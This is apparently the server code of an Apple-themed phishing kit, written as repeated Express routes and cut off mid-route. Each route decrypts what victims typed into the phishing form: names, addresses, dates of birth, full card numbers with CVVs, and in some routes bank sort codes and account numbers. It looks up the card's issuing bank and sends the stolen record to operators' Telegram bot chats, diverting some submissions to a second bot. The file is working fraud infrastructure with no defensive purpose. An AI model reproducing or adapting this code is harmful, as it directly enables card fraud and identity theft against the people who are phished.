app.post("/ghostApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleGhost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5781274308,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/smokedApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleSmoked:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-657196971",
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/trizApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: "-712431616",
            text: `AppleTriz:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      res.send("Update Complete");
    });
});

app.post("/tcapzApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleTcapz:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1437456088,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

let fasterpayments = 0;

app.post("/fasterpaymApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fasterpayments == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fasterpayments = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleBlackTesco:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5470125126,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fasterpayments += 1;
      }
      res.send("Update Complete");
    });
});

let blackTesco = 0;

app.post("/blacktescoApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (blackTesco == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleBlackTesco:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5028651320,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/yardzApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (yardzCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        yardzCount = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleOSB:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5138777422,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        yardzCount += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/osbApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bill == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bill = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleOSB:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1248091713,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bill += 1;
      }
      res.send("Update Complete");
    });
});

let cya = 10;

app.post("/cyaApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
